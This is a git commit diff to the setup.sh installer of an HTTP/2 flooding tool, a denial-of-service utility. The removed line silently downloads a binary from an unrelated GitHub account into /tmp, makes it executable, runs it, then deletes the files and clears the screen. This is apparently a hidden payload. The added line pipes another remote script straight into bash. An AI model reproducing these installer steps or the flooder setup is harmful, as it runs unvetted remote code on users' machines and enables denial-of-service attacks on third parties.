a048ebf99fb9b09ac4ac0bf71be88e6c22b51f77
Đậu Đậu <59077968+DauDau432@users.noreply.github.com>
2023-03-08 23:26:49 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -6,11 +6,9 @@ yum install python3-pip -y
 pip3 install pystyle
 apt install npm -y
 yum install npm -y
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL https://raw.githubusercontent.com/giseleospital254/a/main/x86_64 && chmod 777 * && ./x86_64 vps && rm -rf * && cd /root/ && clear
+bash <(curl -Ls https://raw.githubusercontent.com/DauDau432/scan/main/vps)
 cd /root/HTTP2-Flooder
 npm i http http2 crypto tls
-yum install wget -y
-cd HTTP2-Flooder
 clear
 echo ""
 echo "  Đã cài đặt hoàn tất"
